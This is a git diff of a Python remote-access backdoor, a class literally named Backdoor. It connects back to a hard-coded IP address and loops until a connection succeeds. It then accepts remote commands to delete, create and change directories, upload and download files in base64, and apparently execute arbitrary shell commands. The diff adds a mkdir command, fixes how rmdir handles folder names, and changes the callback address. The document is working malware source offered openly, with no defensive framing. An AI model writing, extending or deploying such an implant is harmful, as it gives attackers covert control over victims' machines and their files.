@@ -56,6 +56,7 @@ class Backdoor:
 
 
 	def run_command(self, receive_command):
+
 		if receive_command[0] == 'exit':
 			self.connection.close()
 			exit()
@@ -63,14 +64,15 @@ class Backdoor:
 		elif receive_command[0] == 'rmdir':
 			
 			file_name = ''
+
 			for i in receive_command:
 				if i != 'rmdir':
 					file_name += i
 					file_name += ' '
 
-				file_name = file_name[0:len(file_name)-1]
-
-			os.rmdir(receive_command[1])
+			file_name = file_name[0:len(file_name)-1]
+			os.rmdir(file_name)
+			return "Folder Name: " + '"' + file_name + '"' + ' Deleted Successfully'
 
 		elif receive_command[0] == 'rm':
 			file_name = ''
@@ -86,12 +88,16 @@ class Backdoor:
 		elif receive_command[0] == 'cd' and len(receive_command) > 1:	
 			path = ''
 			for i in receive_command:
+				
 				if i != 'cd':
+						
 					path += i
 					path += ' '
 			
 			# Removing " " space at the end
+			
 			path = path[0:len(path)-1]
+			
 			result = self.change_dir_to(path)
 		
 		elif receive_command[0] == 'download' and len(receive_command) > 1:
@@ -104,6 +110,19 @@ class Backdoor:
 			file_name = receive_command[1]
 			self.write_files(file_name, base64.b64decode(receive_command[2]))
 			result = "[+] File uploaded Successfully"
+
+
+		elif receive_command[0] == 'mkdir':
+			file_name = ''
+			for i in receive_command:
+				if i != 'mkdir':
+					file_name += i
+					file_name += ' '
+			file_name = file_name[0:len(file_name)-1]
+			os.mkdir(file_name)
+			return "Folder Named: " + '"' + file_name + '"' + ' ' + 'Is Created SuccessFully'
+
+
 
 		else: 
 			try:
@@ -126,10 +145,11 @@ class Backdoor:
 			except Exception:
 				result = "[?] Unkown Error Accured (*_*?) [?]"
 			self.reliable_send(result)
+
 while True:
 	
 	try:
-		backdoor = Backdoor('192.168.42.79', 80)
+		backdoor = Backdoor('192.168.43.76', 80)
 		backdoor.main()
 	except socket.error:
 		pass
